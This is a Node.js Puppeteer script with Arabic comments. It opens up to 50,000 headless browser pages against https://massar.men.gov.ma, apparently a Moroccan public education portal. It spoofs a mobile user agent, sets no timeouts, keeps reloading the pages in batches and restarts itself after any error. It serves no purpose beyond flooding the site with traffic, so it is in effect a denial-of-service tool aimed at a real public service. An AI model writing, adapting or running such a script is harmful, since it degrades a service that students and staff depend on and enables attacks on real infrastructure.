const puppeteer = require('puppeteer');

async function run() {
  try {
    const browser = await puppeteer.launch({ headless: true });
    const userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
    let pageCount = 0;
    const refreshFrequency = 5;
    let pagesToUpdate = [];

    const updatePages = async () => {
      console.log(`تحديث ${pagesToUpdate.length} صفحات`);
      const updatePromises = pagesToUpdate.map(async (page) => {
        try {
          await page.reload({ waitUntil: 'networkidle0', timeout: 0 });
        } catch (error) {
          console.error('حدث خطأ أثناء إعادة تحميل الصفحة:', error);
          throw error; // إعادة رمي الخطأ للتوقف
        }
      });
      await Promise.all(updatePromises);
      pagesToUpdate = [];
    };

    for (let i = 0; i < 50000; i++) {
      const page = await browser.newPage();
      await page.setUserAgent(userAgent);
      await page.setViewport({ width: 414, height: 896 });

      setTimeout(async () => {
        try {
          await page.goto('https://massar.men.gov.ma', { timeout: 0 });
          pageCount++;

          pagesToUpdate.push(page);
          if (pagesToUpdate.length >= refreshFrequency) {
            await updatePages();
          }
        } catch (error) {
          console.error('حدث خطأ أثناء فتح الصفحة:', error);
          throw error; // إعادة رمي الخطأ للتوقف
        }
      }, i * 100);
    }

    if (pagesToUpdate.length > 0) {
      await updatePages();
    }

    console.log(`تم فتح ${pageCount} صفحة وتحديثها بنجاح.`);
  } catch (error) {
    console.error('حدث خطأ أثناء تنفيذ الكود:', error);
    console.log('إعادة التشغيل...');
    await run(); // إعادة تشغيل الكود في حالة حدوث خطأ
  }
}

run();
